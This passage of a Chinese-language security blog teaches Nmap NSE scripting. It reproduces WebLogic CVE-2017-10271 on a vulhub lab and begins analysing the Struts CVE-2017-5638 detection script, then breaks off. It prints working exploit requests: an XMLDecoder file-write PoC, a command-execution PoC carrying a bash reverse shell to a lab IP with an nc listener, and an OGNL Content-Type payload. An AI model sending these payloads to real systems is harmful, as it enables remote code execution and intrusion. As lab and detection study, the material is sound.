+<p>稍微修改了一下，插入一些数据证明可用就可以了<br><strong>测试代码：mysql-store.nse</strong><br><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> mysql = <span class="built_in">require</span> <span class="string">"mysql"</span></span><br><span class="line"><span class="keyword">local</span> serializelib=<span class="built_in">require</span> <span class="string">"serializelib"</span></span><br><span class="line"><span class="keyword">local</span> nmap = <span class="built_in">require</span> <span class="string">"nmap"</span></span><br><span class="line"><span class="keyword">local</span> shortport = <span class="built_in">require</span> <span class="string">"shortport"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">mysqlLogin</span><span class="params">(socket, username, password)</span></span></span><br><span class="line">      <span class="keyword">local</span> <span class="built_in">status</span>, response = mysql.receiveGreeting( socket )</span><br><span class="line">      <span class="keyword">if</span> ( <span class="keyword">not</span>(<span class="built_in">status</span>) ) <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">      <span class="keyword">return</span> mysql.loginRequest( socket, &#123; authversion = <span class="string">"post41"</span>, charset = response.charset &#125;, username, password, response.salt )</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">description = <span class="string">[[test api]]</span></span><br><span class="line"></span><br><span class="line">author = <span class="string">"reborn"</span></span><br><span class="line">license = <span class="string">"Same as Nmap--See http://nmap.org/book/man-legal.html"</span></span><br><span class="line">categories = &#123;<span class="string">"default"</span>&#125;</span><br><span class="line"></span><br><span class="line">portrule = <span class="function"><span class="keyword">function</span> <span class="params">()</span></span> <span class="keyword">return</span> <span class="literal">true</span> <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">portaction</span> <span class="params">(host,port)</span></span></span><br><span class="line">    <span class="keyword">local</span> host_local=<span class="string">"192.168.236.131"</span></span><br><span class="line">    <span class="keyword">local</span> port_local=<span class="string">"3306"</span></span><br><span class="line">    <span class="keyword">local</span> username=<span class="string">"root"</span></span><br><span class="line">    <span class="keyword">local</span> password=<span class="string">"root"</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (port.version.product~=<span class="literal">nil</span>) <span class="keyword">then</span></span><br><span class="line">        version = port.version.product</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">if</span> (port.version.version~=<span class="literal">nil</span>) <span class="keyword">then</span></span><br><span class="line">        version = version .. port.version.version</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">local</span> sql = <span class="built_in">string</span>.<span class="built_in">format</span>(<span class="string">"INSERT INTO nmap.scandata (ip,port,protocol) VALUES ('%s','%s','%s');select 1"</span>,host.ip,port.number,port.protocol)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">local</span> socket = nmap.new_socket()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( <span class="keyword">not</span>(socket:connect(host_local, port_local)) ) <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">return</span> fail(<span class="string">"Failed to connect to server"</span>)</span><br><span class="line">       <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">local</span> <span class="built_in">status</span>, response = mysqlLogin(socket, username, password)</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">status</span> ) <span class="keyword">then</span></span><br><span class="line">         <span class="keyword">local</span> <span class="built_in">status</span>, rs = mysql.sqlQuery( socket, sql )</span><br><span class="line">        socket:<span class="built_in">close</span>()</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">         socket:<span class="built_in">close</span>()</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">local</span> ActionsTable = &#123;</span><br><span class="line">  portrule = portaction</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">-- execute the action function corresponding to the current rule</span></span><br><span class="line">action = <span class="function"><span class="keyword">function</span><span class="params">(...)</span></span> <span class="keyword">return</span> ActionsTable[SCRIPT_TYPE](...) <span class="keyword">end</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="http://oxrfjovwk.bkt.clouddn.com/18-4-30/63099934.jpg" alt=""><br><img src="http://oxrfjovwk.bkt.clouddn.com/18-4-30/57164989.jpg" alt=""><br>要插入的值参考nmap api与在脚本中使用的库文件中的方法所对应的值即可。<br><a href="https://nmap.org/book/nse-api.html" target="_blank" rel="noopener">nmap API</a><br><a href="https://nmap.org/nsedoc/" target="_blank" rel="noopener">nmap scripts&amp;libraries</a></p>
+<h2 id="NSE渗透脚本编写"><a href="#NSE渗透脚本编写" class="headerlink" title="NSE渗透脚本编写"></a>NSE渗透脚本编写</h2><h3 id="CVE-2017-10271"><a href="#CVE-2017-10271" class="headerlink" title="CVE-2017-10271"></a>CVE-2017-10271</h3><p>此次使用的目标漏洞为Weblogic &lt; 10.3.6 ‘wls-wsat’ XMLDecoder反序列化漏洞（CVE-2017-10271）。</p>
+<blockquote>
+<p>靶场使用docker开源靶场：<a href="https://github.com/vulhub" target="_blank" rel="noopener">https://github.com/vulhub</a></p>
+</blockquote>
+<p>Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。</p>
+<p><strong>漏洞复现：</strong><br>测试页面：<br><img src="http://oxrfjovwk.bkt.clouddn.com/18-5-1/64602657.jpg" alt=""></p>
+<p><strong>文件写入Poc：</strong><br>利用的是Java的io包下的PrintWriter类，路径不能出错，并且要有写的权限。<br>访问（<a href="http://your-ip:7001/bea_wls_internal/test.jsp）" target="_blank" rel="noopener">http://your-ip:7001/bea_wls_internal/test.jsp）</a><br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1</span><br><span class="line">Host: 192.168.236.128:7001</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Content-Length: 638</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">"http://bea.com/2004/06/soap/workarea/"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">java</span>&gt;</span><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">"1.4.0"</span> <span class="attr">class</span>=<span class="string">"java.beans.XMLDecoder"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">"java.io.PrintWriter"</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"println"</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span></span><br><span class="line">    &lt;![CDATA[</span><br><span class="line">&lt;% out.print("test"); %&gt;</span><br><span class="line">    ]]&gt;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"close"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">object</span>&gt;</span><span class="tag">&lt;/<span class="name">java</span>&gt;</span><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="http://oxrfjovwk.bkt.clouddn.com/18-5-1/40692060.jpg" alt=""></p>
+<p><strong>命令执行PoC：</strong><br>先进行监听：nc -l -p 1234，然后进行发包。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1</span><br><span class="line">Host: 192.168.236.128:7001</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Content-Length: 640</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span>&gt;</span> <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">"http://bea.com/2004/06/soap/workarea/"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">"1.4.0"</span> <span class="attr">class</span>=<span class="string">"java.beans.XMLDecoder"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span> <span class="attr">length</span>=<span class="string">"3"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"2"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.236.128/1234 0&amp;gt;&amp;amp;1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"start"</span>/&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="http://oxrfjovwk.bkt.clouddn.com/18-5-1/11943554.jpg" alt=""></p>
+<h4 id="http库"><a href="#http库" class="headerlink" title="http库"></a>http库</h4><p>目标漏洞需要使用http请求来发送PoC，须学习http库的使用（<a href="https://nmap.org/nsedoc/lib/http.html" target="_blank" rel="noopener">Library http</a>）<br><strong>1、get请求</strong><br>get (host, port, path, options)<br>主机、端口、路径、其他设置（socket超时时间，HTTP头以及其他参数）<br>返回一个标准响应表<br><strong>2、post请求</strong><br>post (host, port, path, options, ignored, postdata)<br>主机、端口、路径、其他设置、忽略向后兼容(一般设置nil)、post数据<br><strong>3、generic_request 给定方法做一个单一请求</strong><br>generic_request (host, port, method, path, options)<br>主机、端口、方法、路径、其他设置</p>
+<p><strong>函数返回的table值，包括：</strong><br><img src="http://oxrfjovwk.bkt.clouddn.com/18-5-1/36001179.jpg" alt=""><br>例如响应状态码（status），返回正文（body）等等</p>
+<p><strong>Options中可以设定的字段</strong><br><img src="http://oxrfjovwk.bkt.clouddn.com/18-5-1/34859016.jpg" alt=""></p>
+<h4 id="探测脚本编写"><a href="#探测脚本编写" class="headerlink" title="探测脚本编写"></a>探测脚本编写</h4><p><strong>漏洞判断方法：</strong><br>通过向目标写入测试文件，然后访问目标文件，查看是否响应成功以及内容是否为我们原来写入的内容。</p>
+<p>在原始探测脚本中，检测目录存在以及进行发包操作这一块。<br><strong>原始探测脚本：CVE-2017-10271.nse</strong><br><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> req = http.get(host,port,basepath,&#123; no_cache = <span class="literal">true</span>&#125;)  <span class="comment">-- 检测是否存在/wls-wsat/CoordinatorPortType路径的请求</span></span><br><span class="line"><span class="keyword">local</span> reqw= http.post(host,port,basepath,options,<span class="literal">nil</span>,postdata)  <span class="comment">-- 发送POC的请求 </span></span><br><span class="line"><span class="keyword">local</span> reqr= http.get(host,port,randomurl,&#123; no_cache = <span class="literal">true</span>&#125;) <span class="comment">-- 检测POC是否成功写入文件的请求</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">string</span>.<span class="built_in">find</span>(reqr.body,<span class="string">'test'</span>) ~= <span class="literal">nil</span>  <span class="comment">-- 如果写入的文件有xmldecodetest字段，说明漏洞存在</span></span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"Vuln Detect CVE-2017-10271 ,Weblogic &lt; 10.3.6 'wls-wsat' XMLDecoder"</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p>
+<p>就算第一步不存在此路径，后续的步骤依然会执行。这里将原始的url修改为了一个错误的地址<br><img src="http://oxrfjovwk.bkt.clouddn.com/18-5-1/58934858.jpg" alt=""><br><img src="http://oxrfjovwk.bkt.clouddn.com/18-5-1/59080616.jpg" alt=""></p>
+<p>虽然说路径不存在上传是上传不上去，但是多余的请求未免会浪费资源并且也会增加脚本运行时间，加入条件判断语句之后可能又会降低脚本的执行效率…<br><strong>加入了条件语句的修改脚本：weblogic-CVE-2017-10271.nse</strong><br><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 导入http进行请求的发送</span></span><br><span class="line"><span class="keyword">local</span> http = <span class="built_in">require</span> <span class="string">"http"</span></span><br><span class="line"><span class="comment">-- 导入shortport建立端口规则</span></span><br><span class="line"><span class="keyword">local</span> shortport = <span class="built_in">require</span> <span class="string">"shortport"</span></span><br><span class="line"><span class="comment">-- 使用lua的string库来查找body中的字符串</span></span><br><span class="line"><span class="keyword">local</span> <span class="built_in">string</span> = <span class="built_in">require</span> <span class="string">"string"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 描述信息，类别</span></span><br><span class="line">description = <span class="string">[[CVE-2017-10271 Weblogic反序列化漏洞检测]]</span></span><br><span class="line">categories = &#123;<span class="string">"safe"</span>&#125;</span><br><span class="line">license = <span class="string">"Same as Nmap--See https://nmap.org/book/man-legal.html"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 建立portrule</span></span><br><span class="line">portrule = <span class="function"><span class="keyword">function</span><span class="params">( host,port )</span></span></span><br><span class="line">  <span class="keyword">return</span> port.protocol == <span class="string">"tcp"</span> <span class="keyword">and</span> port.state == <span class="string">"open"</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 建立要执行的脚本，当端口发现结束后，对其进行漏洞探测</span></span><br><span class="line">action = <span class="function"><span class="keyword">function</span> <span class="params">( host,port )</span></span></span><br><span class="line">  <span class="comment">-- 指定请求的地址</span></span><br><span class="line">  <span class="keyword">local</span> baseurl = <span class="string">"/wls-wsat/CoordinatorPortType"</span></span><br><span class="line">  <span class="keyword">local</span> testurl = <span class="string">"/bea_wls_internal/test.jsp"</span></span><br><span class="line">  <span class="comment">-- 编写请求头部信息，请求中传入的options参数中可以设定多个值，比如超时时间，头部等，注意设定的格式。脚本中具体值根据PoC中的值设定</span></span><br><span class="line">  <span class="keyword">local</span> options = &#123; header = &#123;</span><br><span class="line">      [<span class="string">"Accept-Encoding"</span>] = <span class="string">"gzip, deflate"</span>,</span><br><span class="line">      [<span class="string">"Accept"</span>] = <span class="string">"*/*"</span>,</span><br><span class="line">      [<span class="string">"Accept-Language"</span>] = <span class="string">"en"</span>,</span><br><span class="line">      [<span class="string">"User-Agent"</span>] = <span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)"</span>,</span><br><span class="line">      [<span class="string">"Connection"</span>] = <span class="string">"close"</span>,</span><br><span class="line">      [<span class="string">"Content-Type"</span>] = <span class="string">"text/xml"</span>,</span><br><span class="line">      [<span class="string">"Content-Length"</span>] = <span class="number">638</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">-- post的数据，这里要注意，单引号里不解析，双引号里会解析</span></span><br><span class="line">  <span class="keyword">local</span> postdata = <span class="string">'&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt;&lt;soapenv:Header&gt;&lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;&lt;java&gt;&lt;java version="1.4.0" class="java.beans.XMLDecoder"&gt;&lt;object class="java.io.PrintWriter"&gt; &lt;string&gt;servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp&lt;/string&gt;&lt;void method="println"&gt;&lt;string&gt;&lt;![CDATA[&lt;% out.print("test"); %&gt;]]&gt;&lt;/string&gt;&lt;/void&gt;&lt;void method="close"/&gt;&lt;/object&gt;&lt;/java&gt;&lt;/java&gt;&lt;/work:WorkContext&gt;&lt;/soapenv:Header&gt;&lt;soapenv:Body/&gt;&lt;/soapenv:Envelope&gt;'</span></span><br><span class="line">  <span class="comment">-- 先使用get方法请求目标路径是否存在，对options参数设定不要留有缓存数据，防止浏览器缓存了测试过的数据导致结果不准确，options中相关的字段可以看http库那里的介绍。</span></span><br><span class="line">  <span class="keyword">local</span> req = http.get(host,port,baseurl,&#123;no_cache = <span class="literal">true</span>&#125;)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">Execute_post</span><span class="params">()</span></span></span><br><span class="line">    <span class="keyword">local</span> req_post = http.post(host,port,baseurl,options,<span class="literal">nil</span>,postdata)</span><br><span class="line">    <span class="keyword">local</span> test_get = http.get(host,port,testurl,&#123;no_cache = <span class="literal">true</span>&#125;)</span><br><span class="line">    <span class="comment">-- 使用string库的方法对目标url进行请求，查看正文中是否有这个值</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">string</span>.<span class="built_in">find</span>(test_get.body,<span class="string">'test'</span>) ~= <span class="literal">nil</span></span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">      <span class="keyword">return</span> (<span class="string">'CVE-2017-10271 WAS DETECT IN THIS SITE!'</span>)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="comment">--如果有这个路径，则进行发包操作</span></span><br><span class="line">  <span class="keyword">if</span> ( req.<span class="built_in">status</span> == <span class="number">200</span>) <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'/wls-wsat/CoordinatorPortType is exists!!!'</span>)</span><br><span class="line">    <span class="keyword">return</span> Execute_post()</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p>
+<p>加入了条件语句之后时间效率提高了2s左右，简单推测网络请求所降低的效率大于条件语句所降低的，不过也还有多方因素，以及网络传输效率等等，在后续步骤为nmap加入并发处理后，效率应该会又有所提升，并发后续再进行学习。</p>
+<p><img src="http://oxrfjovwk.bkt.clouddn.com/18-5-1/94825149.jpg" alt=""><br><img src="http://oxrfjovwk.bkt.clouddn.com/18-5-1/62328954.jpg" alt=""><br>若进行批量检测指定IP段，二来还需要对nmap输出进行优化，上边这一块就先到这里。</p>
+<h3 id="CVE-2017-5638-NSE分析"><a href="#CVE-2017-5638-NSE分析" class="headerlink" title="CVE-2017-5638.NSE分析"></a>CVE-2017-5638.NSE分析</h3><p><strong>漏洞简述：</strong><br>struts使用的Jakarta Multipart解析文件上传请求包不当，远程攻击者可以构造恶意的Content-Type，导致远程命令执行。</p>
+<p><strong>漏洞判断：</strong><br>nmap在判断此漏洞是通过在<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type：%%&#123;#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Check-Struts', '111')&#125;.multipart/form-data</span><br></pre></td></tr></table></figure></p>
+<p>如果在响应头中检测到有X-Check-Struts:111，就证明此漏洞存在。</p>
+<p><strong>脚本分析：</strong><br><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">description = <span class="string">[[</span></span><br><span class="line"><span class="string">Detects whether the specified URL is vulnerable to the Apache Struts</span></span><br><span class="line"><span class="string">Remote Code Execution Vulnerability (CVE-2017-5638).</span></span><br><span class="line"><span class="string">]]</span></span><br><span class="line"><span class="comment">-- 引入相关库文件</span></span><br><span class="line"><span class="keyword">local</span> http = <span class="built_in">require</span> <span class="string">"http"</span>   <span class="comment">-- 用来发送http请求。</span></span><br><span class="line"><span class="keyword">local</span> shortport = <span class="built_in">require</span> <span class="string">"shortport"</span>   <span class="comment">-- 对端口号以及服务进行匹配看是否满足要求。</span></span><br><span class="line"><span class="keyword">local</span> vulns = <span class="built_in">require</span> <span class="string">"vulns"</span>   <span class="comment">-- 以普通的格式对漏洞进行报告和存储。</span></span><br><span class="line"><span class="keyword">local</span> stdnse = <span class="built_in">require</span> <span class="string">"stdnse"</span> <span class="comment">-- 标准NMAP脚本引擎，包括各种简便的函数，比如打印出一些调试信息，进行睡眠等等。</span></span><br><span class="line"><span class="keyword">local</span> <span class="built_in">string</span> = <span class="built_in">require</span> <span class="string">"string"</span>  <span class="comment">-- Lua string库，对字符串进行操作</span></span><br><span class="line"></span><br><span class="line"><span class="comment">---</span></span><br><span class="line"><span class="comment">-- @usage</span></span><br><span class="line"><span class="comment">-- nmap -p &lt;port&gt; --script http-vuln-cve2017-5638 &lt;target&gt;</span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment">-- @output</span></span><br><span class="line"><span class="comment">-- PORT    STATE SERVICE</span></span><br><span class="line"><span class="comment">-- 80/tcp  open  http</span></span><br><span class="line"><span class="comment">-- | http-vuln-cve2017-5638:</span></span><br><span class="line"><span class="comment">-- |   VULNERABLE</span></span><br><span class="line"><span class="comment">-- |   Apache Struts Remote Code Execution 